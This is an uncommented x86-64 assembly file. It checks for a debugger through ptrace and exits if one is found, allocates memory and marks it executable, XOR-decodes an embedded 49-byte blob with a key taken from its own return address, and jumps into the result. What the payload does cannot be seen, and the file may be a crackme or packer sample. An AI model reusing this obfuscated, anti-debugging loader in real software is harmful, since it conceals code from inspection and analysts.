	
	.section .text
	.globl _start

f:
	popq	%rax
	pushq	%rax
	pushq	%rbx
	movq	%rax,%rbx
	pushq	$0x65
	popq	%rax
	xorl	%edi,%edi
	xorl	%edx,%edx
	xorl	%esi,%esi
	xorl	%r10d,%r10d
	syscall
	testl	%eax,%eax
	jns	.L0
	xorl	%edi,%edi
	pushq	$0x3c
	popq	%rax
	syscall
.L0:
	movl	%ebx,%eax
	shrl	$0x10,%eax
	xorb	$0x2e,%al
	movzxb	%al,%eax
	popq	%rbx
	ret

_start:

	call	f
	pushq	%rax
	xorl	%edi,%edi
	pushq	$0xc
	popq	%rax
	syscall
	pushq	%rax
	addb	$0x31,%al
	movq	%rax,%rdi
	pushq	$0xc
	popq	%rax
	syscall
	pushq	$0xa
	popq	%rax
	popq	%rdi
	pushq	%rdi
	pushq	$0x31
	popq	%rsi
	pushq	$7
	popq	%rdx
	syscall
	xorl	%ecx,%ecx
	popq	%rdi
	movq	$0x1c014a6aa93eae5f,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x4f6a4a2aa9080a02,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x102020b26d62664,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x4366f043e394e42,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x34600488e726316f,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x61365204915f6b61,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	pushq	$0x30
	popq	%rcx
	movb	$0x6b,0x0(%rdi,%rcx,1)
	popq	%rax
.L1:
	xorb	%al,0x0(%rdi,%rcx,1)
	decl	%ecx
	jns	.L1
	jmp	*%rdi
